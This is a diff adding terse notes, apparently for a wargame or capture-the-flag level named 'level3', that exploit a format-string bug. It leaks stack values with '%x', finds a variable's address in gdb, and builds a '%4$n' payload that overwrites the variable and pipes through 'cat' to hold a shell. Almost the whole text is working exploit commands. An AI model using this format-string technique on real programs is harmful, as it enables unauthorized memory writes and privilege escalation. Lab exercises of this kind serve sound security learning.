@@ -1,0 +1,16 @@
+Gives the position of the text on the stack
+python -c 'print ("0000 " + "%x " * 10)' | ./level3
+
+(gdb) run
+Starting program: /home/user/level3/level3 
+
+
+[Inferior 1 (process 4310) exited normally]
+(gdb) p &m
+$1 = (<data variable, no debug info> *) 0x804988c
+
+
+python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"'
+
+
+(python -c 'print "\x8c\x98\x04\x08" + "A" * 60 +  "%4$n"' && cat) | ./level3
